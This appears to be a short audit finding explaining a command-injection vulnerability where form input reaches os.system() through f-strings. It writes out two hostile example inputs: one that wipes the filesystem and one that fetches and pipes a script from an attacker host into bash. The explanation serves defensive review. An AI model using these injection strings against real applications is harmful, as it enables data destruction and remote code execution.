The code uses `os.system()` to execute shell commands constructed with f-strings, which is inherently vulnerable to command injection attacks. An attacker can inject malicious shell commands by providing specially crafted input through `request.form` or `request.args.args`, and these commands will be executed with the privileges of the underlying application process. For example, a user could set `request.form['image_name'] = "$(rm -rf /)"` or `request.form['image_name'] = "ubuntu'; curl http://attacker.com/malware|bash; '"` to achieve arbitrary code execution, file deletion, or system compromise. The lack of input sanitization, validation, escaping, or use of safer alternatives like `subprocess.run()` with argument splitting enabled means the application has *no protection* against this critical vulnerability, potentially enabling attackers to fully control the system through seemingly innocuous form inputs.

